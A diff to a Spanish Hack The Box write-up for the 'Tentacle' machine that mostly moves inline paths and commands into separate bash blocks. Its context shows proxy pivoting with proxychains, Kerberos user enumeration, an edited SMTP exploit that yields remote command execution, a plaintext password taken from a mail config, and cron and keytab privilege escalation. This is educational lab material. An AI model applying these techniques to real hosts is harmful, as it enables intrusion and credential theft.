@@ -55,8 +55,20 @@ nmap -sCV -p22,53,88,3128 10.10.10.224 -oN targeted
 
 #### Checkear la web {-}
 
-Si entramos en la url `http://10.10.10.224:3128`. Vemos una pagina de error y podemos ver que el administrador es **j.nakazawa@realcorp.htb**. Tambien al fondo
-de la pagina vemos un dominio `srv01.realcorp.htb`. Lo añadimos al `/etc/hosts`.
+Si entramos en la url 
+```bash
+ http://10.10.10.224:3128 
+```
+. Vemos una pagina de error y podemos ver que el administrador es **j.nakazawa@realcorp.htb**. Tambien al fondo
+de la pagina vemos un dominio 
+```bash
+ srv01.realcorp.htb 
+```
+. Lo añadimos al 
+```bash
+ /etc/hosts 
+```
+.
 
 ### Checkeo del dominio {-}
 
@@ -67,14 +79,22 @@ dig @10.10.10.224 realcorp.htb mx
 dig @10.10.10.224 realcorp.htb axfr
 ```
 
-Podemos ver en los nameservers que el dominio **ns.realcorp.htb** apunta a la ip `10.197.243.77`.
+Podemos ver en los nameservers que el dominio **ns.realcorp.htb** apunta a la ip 
+```bash
+ 10.197.243.77 
+```
+.
 
 ### Enumeracion de puertos con Squid Proxy {-}
 
 El uso de un *Squid Proxy* nos hace pensar como atacante que podemos con el uso de **proxychain** enumerar puertos internos de la 
 maquina victima.
 
-Añadimos los datos del *squid proxy* al final de nuestro fichero `/etc/proxychains.conf`
+Añadimos los datos del *squid proxy* al final de nuestro fichero 
+```bash
+ /etc/proxychains.conf 
+```
+
 
 ```bash
 http    10.10.10.224    3128
@@ -110,7 +130,11 @@ Aqui vemos nuevos dominios
 - proxy.realcorp.htb -> ns.realcorp.htb
 - wpad.realcorp.htb -> 10.197.243.31
 
-Añadimos los dominios al `/etc/hosts` con las mismas ip. Como pasamos por proxychains, podemos intentar enumerar puertos de estas ip.
+Añadimos los dominios al 
+```bash
+ /etc/hosts 
+```
+ con las mismas ip. Como pasamos por proxychains, podemos intentar enumerar puertos de estas ip.
 
 ```bash
 proxychains -q nmap -sT -Pn -v -n 10.197.243.77
@@ -135,7 +159,11 @@ esto resulta en lo siguiente.
 
 ![Tetacle-ormal-roxychais-cof](/assets/images/Tentacle-normal-proxychains-conf.png) 
 Pasamos por internet para con el Squid Proxy scanear el 10.197.243.77. Pensamos que es un **Internal Squid Proxy** porque el dominio es 
-`proxy.realcorp.htb`. Hemos podido comprobar que esta tecnica no funcciona.
+
+```bash
+ proxy.realcorp.htb 
+```
+. Hemos podido comprobar que esta tecnica no funcciona.
 
 Lo que queremos hacer es uzar otra configuracion del proxychains para que pasemos por el Squid Proxy hacia la interface interna del puerto 3128
 de este mismo Squid Proxy.
@@ -171,7 +199,11 @@ for prot in $(seq 1 65535); do
 done; wait
 ```
 
-Como no vemos nigun puerto interesante vamos a intentar con la misma tecnica scanear otros sercios como el `wpad.realcorp.htb`
+Como no vemos nigun puerto interesante vamos a intentar con la misma tecnica scanear otros sercios como el 
+```bash
+ wpad.realcorp.htb 
+```
+
 
 ```{r, echo = FALSE, fig.cap="internal servers scanning", out.width="90%"}
     knitr::include_graphics("images/Tentacle-otherserv-proxychains-conf.png")
@@ -186,7 +218,11 @@ for prot in $(seq 1 65535); do
 done; wait
 ```
 
-como no funcciona, esto significa que tenemos que modificar nuestro `/etc/proxychains.conf` para pasar tambien por el squid proxy interno.
+como no funcciona, esto significa que tenemos que modificar nuestro 
+```bash
+ /etc/proxychains.conf 
+```
+ para pasar tambien por el squid proxy interno.
 
 ```bash
 http    10.10.10.224    3128
@@ -194,7 +230,11 @@ http    127.0.0.1   3128
 http    10.197.243.77 3128
 ```
 
-Si lanzamos el commando `proxychains nmap -sT -Pn -v -n 10.197.243.31 -p22` podemos ver lo siguiente.
+Si lanzamos el commando 
+```bash
+ proxychains nmap -sT -Pn -v -n 10.197.243.31 -p22 
+```
+ podemos ver lo siguiente.
 
 ```{r, echo = FALSE, fig.cap="Proxychains chain", out.width="90%"}
     knitr::include_graphics("images/Tentacle-proxychains-chain.png")
@@ -230,7 +270,11 @@ y si, existe y podemos ver lo siguiente
     knitr::include_graphics("images/Tentacle-wpad-dat.png")
 ```
 
-Aqui vemos un nuevo rango de ip `10.241.251.0 255.255.255.0` que no teniamos antes. El problema es que proxychains no tiene el binario ping configurado para
+Aqui vemos un nuevo rango de ip 
+```bash
+ 10.241.251.0 255.255.255.0 
+```
+ que no teniamos antes. El problema es que proxychains no tiene el binario ping configurado para
 este uso. Tenemos que pasar nuevamente por un script en bash.
 
 ```bash
@@ -294,7 +338,15 @@ si el usuario j.nakazawa existe.
     kerbrute userenum --dc 10.10.10.224 -d realcorp.htb users
     ```
 
-vemos que el usuario es valido. En el exploit, cambiamos el `s.send(b'RCPT TO:<root>\r\n')` por `s.send(b'RCPT TO:<j.nakazawa@realcorp.htb>\r\n')` y lanzamos 
+vemos que el usuario es valido. En el exploit, cambiamos el 
+```bash
+ s.send(b'RCPT TO:<root>\r\n') 
+```
+ por 
+```bash
+ s.send(b'RCPT TO:<j.nakazawa@realcorp.htb>\r\n') 
+```
+ y lanzamos 
 nuevamente el exploit. Vemos que tenemos un GET en nuestro servidor web lo que significa que podemos ejecutar comandos y que tenemos conectividad con esta
 maquina.## Vuln exploit & Gaining Access {-}
 
@@ -346,7 +398,11 @@ stty rows <rownb> columns <colnb>
 ```
 
 
-Aqui ya miramos si podemos leer la flag pero no es el caso. Vemos un fichero `.msmtprc` en el directorio home del usuario j.nakazawa
+Aqui ya miramos si podemos leer la flag pero no es el caso. Vemos un fichero 
+```bash
+ .msmtprc 
+```
+ en el directorio home del usuario j.nakazawa
 
 ```bash
 cd /home/j.nakazawa
@@ -369,7 +425,11 @@ Servidores de Kerberos para su reino: 10.10.10.224
 Servidor administrativo para su reino: 10.10.10.224
 ```
 
-Aqui podemos modificar el fichero `/etc/krb5.conf` de configuracion para tener lo siguiente
+Aqui podemos modificar el fichero 
+```bash
+ /etc/krb5.conf 
+```
+ de configuracion para tener lo siguiente
 
 ```bash
 [libdefaults]
@@ -393,7 +453,11 @@ Cacheamos las credenciales del usuario al kerberos con el commando
 Password for j.nakazawa@REALCORP.HTB: sJB}RM>6Z~64_
 ```
 
-Vemos que un fichero `/tmp/krb5cc_0` a sido creado y ahora podemos connectar por ssh 
+Vemos que un fichero 
+```bash
+ /tmp/krb5cc_0 
+```
+ a sido creado y ahora podemos connectar por ssh 
 
 ```bash
 ssh j.nakazawa@10.10.10.224
@@ -409,8 +473,20 @@ id
 cat /etc/crontab
 ```
 
-Aqui vemos que hay una tarea que se ejecuta por el usuario admin cada minuto. El script es `/usr/local/bin/log_backup.sh`
-Este archivo basicamente copia lo que hay en el directorio `/var/log/squid` en el directorio `/home/admin`.
+Aqui vemos que hay una tarea que se ejecuta por el usuario admin cada minuto. El script es 
+```bash
+ /usr/local/bin/log_backup.sh 
+```
+
+Este archivo basicamente copia lo que hay en el directorio 
+```bash
+ /var/log/squid 
+```
+ en el directorio 
+```bash
+ /home/admin 
+```
+.
 
 ```bash
 cd /home/admin
@@ -446,7 +522,11 @@ find / -type f -user admin 2>/dev/null | grep -v -E "proc|cgroup"
 find / -type f -group admin 2>/dev/null | grep -v -E "proc|cgroup"
 ```
 
-Encontramos un fichero `/etc/krb5.keytab`
+Encontramos un fichero 
+```bash
+ /etc/krb5.keytab 
+```
+
 
 ```bash
 cat /etc/krb5.keytab
